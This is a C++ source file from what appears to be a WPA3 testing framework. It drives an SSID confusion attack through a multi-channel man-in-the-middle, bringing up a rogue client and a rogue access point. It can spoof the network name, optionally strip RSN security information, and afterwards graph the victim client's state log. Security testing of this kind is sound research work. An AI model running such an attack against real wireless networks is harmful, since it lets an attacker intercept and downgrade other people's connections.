#include "attacks/mc_mitm/ssid_confusion_attack.h"

#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion_hooks.h"
#include "config/RunStatus.h"
#include "observer/state_log_graph.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion{
void run_attack(RunStatus &rs){
	const auto rogue_client = rs.get_actor("rogue_client");
	const auto rogue_ap     = rs.get_actor("rogue_ap");
	const auto ap           = rs.get_actor("ap");
	const auto client       = rs.get_actor("client");

	const auto &att_cfg       = rs.config().at("attack_config");
	const string real_ssid     = ap["ssid"];
	const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
	const bool   strip_rsn     = att_cfg.value("strip_rsn", false);
	const int    timeout       = att_cfg.value("attack_time_sec", 30);

	McMitm attack(rogue_client, rogue_ap, real_ssid,
				  ap.get(SK::mac), client.get(SK::mac),
				  rs.run_folder() / "logger");

	attack.set_hooks(make_unique<SsidConfusionHooks>(real_ssid, confused_ssid, strip_rsn));

	rogue_client->set_iface_up();
	rogue_client->up_sniff_iface();
	rogue_ap->set_iface_up();
	rs.start_observers();

	attack.netconfig.real_channel  = rogue_client->get_channel();
	attack.netconfig.rogue_channel = rogue_ap->get_channel();
	attack.netconfig.ssid          = real_ssid;

	attack.run(rs, timeout);
}

void stats_attack(const RunStatus &rs) {
	const string mac_str = rs.get_actor("rogue_client").get(SK::mac);
	const filesystem::path state_log = rs.run_folder() / "observer" / "client_state" / (mac_str + ".log");
	const filesystem::path out_log = rs.run_folder() / "observer" / "client_state" / "rogue_client.png";
	observer::state_log_graph::create_state_log_graph(state_log,out_log);
}

}